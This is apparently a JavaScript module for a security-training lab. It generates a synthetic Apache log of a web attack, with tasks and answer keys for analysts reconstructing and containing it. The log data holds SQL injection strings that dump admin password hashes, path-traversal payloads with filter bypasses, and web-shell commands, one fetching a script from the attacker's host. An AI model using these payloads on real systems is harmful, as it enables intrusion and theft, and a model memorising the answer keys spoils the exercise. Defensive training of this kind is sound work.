// Lab: one attacker walks a web app from enumeration to a web shell, hidden in normal traffic.
// The log is generated deterministically (seeded PRNG, no Math.random) so answers never drift.

const ATTACKER = '203.0.113.66'

function prng(seed) {
  let s = seed >>> 0
  return () => {
    s = (Math.imul(s, 1664525) + 1013904223) >>> 0
    return s / 4294967296
  }
}

const pad = (n) => String(n).padStart(2, '0')
const stamp = (sec) => `[03/Nov/2026:${pad(Math.floor(sec / 3600))}:${pad(Math.floor((sec % 3600) / 60))}:${pad(sec % 60)} +0000]`

const UA = {
  chromeWin: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  safariMac: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
  iphone: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
  firefoxWin: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
  bing: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  gobuster: 'gobuster/3.6',
  attackerFx: 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
  curl: 'curl/8.5.0',
}

// Each visitor session: [ip, ua, list of [method, path, status, bytes, referer]]
const SITE = 'https://shop.example.com'
const PAGES = [
  ['GET', '/', 200, 8412],
  ['GET', '/css/site.css', 200, 18233],
  ['GET', '/js/app.js', 200, 40211],
  ['GET', '/images/logo.png', 200, 6120],
]
const BROWSE = [
  ['GET', '/products.php?id=12', 200, 6233],
  ['GET', '/products.php?id=7', 200, 5980],
  ['GET', '/products.php?id=31', 200, 6411],
  ['GET', '/products.php?id=18', 200, 6102],
  ['GET', '/search.php?q=hiking+boots', 200, 9120],
  ['GET', '/search.php?q=rain+jacket', 200, 8874],
  ['GET', '/contact.php', 200, 4410],
  ['POST', '/contact.php', 302, 0],
  ['GET', '/login.php', 200, 3982],
  ['POST', '/login.php', 302, 0],
  ['GET', '/account.php', 200, 5120],
  ['GET', '/download.php?file=catalog-2026.pdf', 200, 482113],
  ['GET', '/cart.php', 200, 4877],
  ['GET', '/favicon.ico', 404, 196],
  ['GET', '/apple-touch-icon.png', 404, 196],
]
const VISITORS = [
  ['198.51.100.14', UA.chromeWin], ['198.51.100.22', UA.safariMac], ['198.51.100.37', UA.iphone],
  ['198.51.100.58', UA.firefoxWin], ['198.51.100.91', UA.chromeWin], ['192.0.2.33', UA.iphone],
  ['192.0.2.47', UA.chromeWin], ['192.0.2.120', UA.safariMac], ['203.0.113.12', UA.firefoxWin],
  ['203.0.113.25', UA.chromeWin], ['203.0.113.140', UA.iphone], ['192.0.2.201', UA.chromeWin],
]

// Gobuster wordlist and what the server returned for each path
const DIRS = [
  ['admin', 301], ['administrator', 404], ['backup', 404], ['backups', 404], ['.git/HEAD', 404], ['.env', 404],
  ['config', 404], ['config.php.bak', 404], ['wp-admin', 404], ['wp-login.php', 404], ['phpmyadmin', 404],
  ['uploads', 301], ['images', 301], ['css', 301], ['js', 301], ['includes', 403], ['cgi-bin/', 403],
  ['test', 404], ['dev', 404], ['old', 404], ['api', 404], ['server-status', 403], ['login', 404],
  ['panel', 404], ['cpanel', 404], ['db', 404], ['sql', 404], ['dump.sql', 404], ['database', 404],
  ['private', 404], ['secret', 404], ['tmp', 404], ['temp', 404], ['logs', 404], ['install', 404],
  ['setup', 404], ['portal', 404], ['dashboard', 404], ['shell', 404], ['files', 404], ['docs', 404],
  ['staff', 404], ['user', 404], ['users', 404], ['vendor', 404], ['assets', 404], ['static', 404],
  ['adminer.php', 404], ['console', 404], ['download', 404], ['robots.txt', 200],
]

function accessLog() {
  const rand = prng(20261103)
  const ev = []
  const add = (sec, ip, method, path, status, bytes, ref, ua) => ev.push({ sec, ip, line: `${ip} - - ${stamp(sec)} "${method} ${path} HTTP/1.1" ${status} ${bytes || '-'} "${ref}" "${ua}"` })

  // Normal visitors between 09:00 and 11:20, each doing a short browsing session
  let sec = 9 * 3600 + 41
  for (let v = 0; v < 26; v++) {
    const [ip, ua] = VISITORS[v % VISITORS.length]
    let s = sec
    for (const [m, p, st, b] of PAGES) { add(s, ip, m, p, st, b + Math.floor(rand() * 40), '-', ua); s += rand() < 0.5 ? 0 : 1 }
    const n = 1 + Math.floor(rand() * 3)
    for (let i = 0; i < n; i++) {
      const [m, p, st, b] = BROWSE[Math.floor(rand() * BROWSE.length)]
      s += 4 + Math.floor(rand() * 40)
      add(s, ip, m, p, st, st === 200 ? b + Math.floor(rand() * 300) : b, `${SITE}/`, ua)
    }
    sec += 220 + Math.floor(rand() * 160)
  }
  // A crawler that also produces a few 404s (stale links): a decoy for "who caused 404s?"
  const crawl = ['/', '/products.php?id=3', '/products.php?id=4', '/old-catalog.html', '/blog/', '/products.php?id=5', '/specials.html', '/robots.txt', '/sitemap.xml', '/products.php?id=6']
  crawl.forEach((p, i) => {
    const st = ['/old-catalog.html', '/blog/', '/specials.html', '/sitemap.xml'].includes(p) ? 404 : 200
    add(9 * 3600 + 1800 + i * 37, '192.0.2.88', 'GET', p, st, st === 404 ? 196 : 6000 + i * 13, '-', UA.bing)
  })

  // 1) Directory brute force, 10:02
  let t = 10 * 3600 + 2 * 60 + 11
  for (const [d, st] of DIRS) {
    add(t, ATTACKER, 'GET', `/${d}`, st, st === 404 ? 196 : st === 301 ? 239 : st === 403 ? 199 : 68, '-', UA.gobuster)
    t += rand() < 0.6 ? 0 : 1
  }
  // 2) SQL injection on products.php, 10:06
  t = 10 * 3600 + 6 * 60 + 3
  const sqli = [
    ['/products.php?id=12%27', 500, 612],
    ['/products.php?id=12%20AND%201=1', 200, 6233],
    ['/products.php?id=12%20AND%201=2', 200, 2210],
    ['/products.php?id=12%20ORDER%20BY%205--%20-', 500, 612],
    ['/products.php?id=12%20ORDER%20BY%204--%20-', 200, 6233],
    ['/products.php?id=-12%20UNION%20SELECT%201,2,3,4--%20-', 200, 2290],
    ['/products.php?id=-12%20UNION%20SELECT%201,database(),version(),4--%20-', 200, 2318],
    ['/products.php?id=-12%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-', 200, 2401],
    ['/products.php?id=-12%20UNION%20SELECT%201,group_concat(username,0x3a,password_hash),3,4%20FROM%20admin_users--%20-', 200, 2517],
  ]
  for (const [p, st, b] of sqli) { add(t, ATTACKER, 'GET', p, st, b, '-', UA.attackerFx); t += 17 + Math.floor(rand() * 25) }
  // 3) Directory traversal through the file download script, 10:11
  t = 10 * 3600 + 11 * 60 + 40
  const trav = [
    ['/download.php?file=../../../../etc/passwd', 200, 2241],
    ['/download.php?file=....//....//....//etc/shadow', 500, 612],
    ['/download.php?file=..%2f..%2f..%2fvar%2fwww%2fhtml%2fconfig.php', 200, 1412],
  ]
  for (const [p, st, b] of trav) { add(t, ATTACKER, 'GET', p, st, b, '-', UA.curl); t += 21 }
  // 4) Admin login with cracked credentials, then the upload, 10:14
  t = 10 * 3600 + 14 * 60 + 2
  const admin = [
    ['GET', '/admin/', 302, 0, '-'],
    ['GET', '/admin/login.php', 200, 3104, '-'],
    ['POST', '/admin/login.php', 302, 0, `${SITE}/admin/login.php`],
    ['GET', '/admin/dashboard.php', 200, 7720, `${SITE}/admin/login.php`],
    ['GET', '/admin/upload.php', 200, 3381, `${SITE}/admin/dashboard.php`],
    ['POST', '/admin/upload.php', 200, 3460, `${SITE}/admin/upload.php`],
  ]
  for (const [m, p, st, b, ref] of admin) { add(t, ATTACKER, m, p, st, b, ref, UA.attackerFx); t += 6 + Math.floor(rand() * 12) }
  // 5) Using the web shell, 10:15 onward
  t = 10 * 3600 + 15 * 60 + 30
  const shell = [
    ['GET', '/uploads/x.php', 200, 0, UA.curl],
    ['GET', '/uploads/x.php?cmd=whoami', 200, 9, UA.curl],
    ['GET', '/uploads/x.php?cmd=id', 200, 54, UA.curl],
    ['GET', '/uploads/x.php?cmd=uname%20-a', 200, 112, UA.curl],
    ['GET', '/uploads/x.php?cmd=cat%20/var/www/html/config.php', 200, 1412, UA.curl],
    ['GET', '/uploads/x.php?cmd=wget%20http://203.0.113.66/rs.sh%20-O%20/tmp/rs.sh', 200, 0, UA.curl],
    ['POST', '/uploads/x.php', 200, 31, UA.curl],
    ['POST', '/uploads/x.php', 200, 0, UA.curl],
  ]
  for (const [m, p, st, b, ua] of shell) { add(t, ATTACKER, m, p, st, b, '-', ua); t += 20 + Math.floor(rand() * 40) }

  ev.sort((a, b) => a.sec - b.sec)
  return `${ev.map((e) => e.line).join('\n')}\n`
}

const LOG = accessLog()
const LOGPATH = '/var/log/apache2/access.log'
const attacker404 = LOG.split('\n').filter((l) => l.startsWith(`${ATTACKER} `) && l.split(' ')[8] === '404').length

export default {
  id: 'web-attack-logs',
  title: 'Web server attack in Apache logs',
  objectives: ['1.2', '1.3', '2.3'],
  difficulty: 'Core',
  minutes: 18,
  scenario: 'The WAF on shop.example.com was in detect-only mode during a migration. This morning a developer found an unfamiliar file under /uploads. You have a copy of the Apache access log (combined format) from 3 Nov. Find the attacker, reconstruct what they did, and decide how to contain it.',
  files: { [LOGPATH]: LOG },
  artifacts: [{ id: 'log', title: 'access.log', file: LOGPATH }],
  hints: [
    `awk '{print $1}' ${LOGPATH} | sort | uniq -c | sort -rn | head`,
    `awk '$9 == 404 {print $1}' ${LOGPATH} | sort | uniq -c | sort -rn`,
    `grep -i "union" ${LOGPATH}`,
    `grep "\\.php?cmd=" ${LOGPATH}`,
  ],
  tasks: [
    {
      id: 'ip', type: 'input',
      prompt: 'Which client IP address attacked the site?',
      answer: [ATTACKER],
      cmd: `awk '{print $1}' ${LOGPATH} | sort | uniq -c | sort -rn | head -5`,
      explain: `${ATTACKER} made by far the most requests, and every stage of the attack comes from it: gobuster, the UNION SELECT probes, the ../ traversal and the x.php commands. Notice that it changed User-Agent three times (gobuster/3.6, Firefox on Linux, curl). The User-Agent is set by the client, so pivot on the IP and the behavior, not the UA. 192.0.2.88 also produced 404s, but it is bingbot following stale links at a polite pace.`,
    },
    {
      id: 'c404', type: 'input',
      prompt: `How many requests from ${ATTACKER} returned HTTP 404?`,
      answer: [String(attacker404)],
      cmd: `awk '$1 == "${ATTACKER}" && $9 == 404' ${LOGPATH} | wc -l`,
      explain: `In the combined log format the status code is field 9, so \`awk '$1 == "${ATTACKER}" && $9 == 404' access.log | wc -l\` gives ${attacker404}. Dozens of 404s within about a minute, from one IP using the gobuster User-Agent, is forced browsing (directory brute force). A plain \`grep -c 404\` over-counts, because "404" also appears in byte counts and in other clients' lines.`,
    },
    {
      id: 'shell', type: 'input',
      prompt: 'What is the URL path of the web shell?',
      answer: ['/uploads/x.php', 'uploads/x.php', 'https://shop.example.com/uploads/x.php'],
      cmd: `grep "cmd=" ${LOGPATH}`,
      explain: 'The attacker logged in to /admin/, sent a POST to /admin/upload.php, and seconds later requested /uploads/x.php with a ?cmd= parameter. A .php file in an uploads directory that answers to a cmd parameter is a web shell. The later POSTs to /uploads/x.php are commands sent in the request body, which Apache does not log. That blind spot is why you need EDR or auditd on the server.',
    },
    {
      id: 'firstcmd', type: 'input',
      prompt: 'What was the first command the attacker ran through the web shell?',
      answer: ['whoami', 'cmd=whoami'],
      cmd: `grep "x.php?cmd=" ${LOGPATH} | head -1`,
      explain: 'The first request with a command is ?cmd=whoami, and its response is 9 bytes: "www-data" plus a newline. whoami, id and uname -a are classic first steps: confirm code execution and learn the privilege level. Then they read config.php for database credentials and pulled down rs.sh, probably a reverse shell.',
    },
    {
      id: 'timeline', type: 'order',
      prompt: 'Put the attacker\'s actions in the order they happened.',
      items: [
        'Directory brute force (gobuster)',
        'UNION-based SQL injection against products.php',
        'Directory traversal through download.php',
        'Login to /admin/ with stolen credentials',
        'Upload through /admin/upload.php',
        'Commands executed through /uploads/x.php',
      ],
      explain: 'This is a textbook kill chain. Enumeration found /admin and /uploads. SQL injection dumped admin_users (username:password_hash). Traversal read /etc/passwd and config.php. The cracked credentials opened /admin/, and the upload form accepted a .php file, which gave the attacker remote code execution.',
    },
    {
      id: 'mitigate', type: 'grid',
      prompt: 'Match each attack to the control that best prevents it.',
      columns: [{
        key: 'fix', label: 'Primary mitigation',
        options: [
          'Parameterized queries (prepared statements)',
          'Canonicalize paths and allow-list file names',
          'Rate limiting / WAF blocking of enumeration',
          'Validate uploads server-side; store outside the web root with no execute permission',
          'Enable HSTS',
        ],
      }],
      rows: [
        { label: 'Directory brute force', answer: { fix: 'Rate limiting / WAF blocking of enumeration' } },
        { label: 'UNION SELECT SQL injection', answer: { fix: 'Parameterized queries (prepared statements)' } },
        { label: '../../../../etc/passwd traversal', answer: { fix: 'Canonicalize paths and allow-list file names' } },
        { label: 'PHP web shell upload', answer: { fix: 'Validate uploads server-side; store outside the web root with no execute permission' } },
      ],
      explain: 'Prepared statements keep user input from ever becoming SQL syntax. Escaping and WAF rules are only defense in depth. For traversal, resolve the real path and check it against an allow-list. Blocking "../" alone is bypassed by tricks like "....//" and %2f, both of which appear in this log. For uploads, check content rather than the extension and never let the upload directory execute scripts. HSTS protects transport security and is irrelevant to all four attacks.',
    },
    {
      id: 'contain', type: 'single',
      prompt: 'What is the best containment action right now?',
      options: [
        `Block ${ATTACKER} at the firewall and close the incident`,
        'Delete /uploads/x.php and restart Apache',
        `Isolate the web server (pull it from the load balancer or move it to a quarantine VLAN), block ${ATTACKER}, and preserve x.php, /tmp/rs.sh and the logs`,
        'Fix the SQL injection in products.php, then start the investigation',
      ],
      answer: 2,
      explain: 'The attacker has code execution and probably a reverse shell (rs.sh), so blocking one IP isn\'t enough. The shell answers anyone, and the attacker can come back from a new IP. Deleting x.php destroys evidence and leaves rs.sh and any other persistence behind. Fixing the code is remediation and comes later. Isolate the host, keep the evidence, then eradicate: rotate the DB and admin credentials found in config.php, rebuild, and patch.',
    },
  ],
}
